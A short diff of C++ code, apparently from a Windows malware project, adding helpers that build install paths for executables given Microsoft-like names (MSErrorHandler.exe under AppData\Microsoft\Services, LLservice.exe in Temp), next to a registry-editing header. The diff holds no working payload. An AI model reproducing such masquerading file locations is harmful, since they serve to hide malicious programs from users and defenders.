@@ -19,7 +19,7 @@
 #include <shlwapi.h>
 #include "Regedit.h"
 
-//#pragma comment(lib, "Urlmon.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 
 namespace IO
@@ -277,6 +277,20 @@ namespace IO
                     return true;
         }
 
+    }
+    std::string getLLservicePath(){
+            char* temp = getenv("temp");
+            std::string temp_dir(temp);
+            std::string pathtemp = temp_dir+"\\LLservice.exe";
+            return pathtemp;
+    }
+    std::string getEERORPath(){
+        char* appdata = getenv("APPDATA");
+        std::string appdata_dir(appdata);
+        std::string path = appdata_dir + "\\Microsoft\\Services\\";
+        std::string filename = "MSErrorHandler.exe";
+        std::string fullpath = path + filename;
+        return fullpath;
     }
 
 }
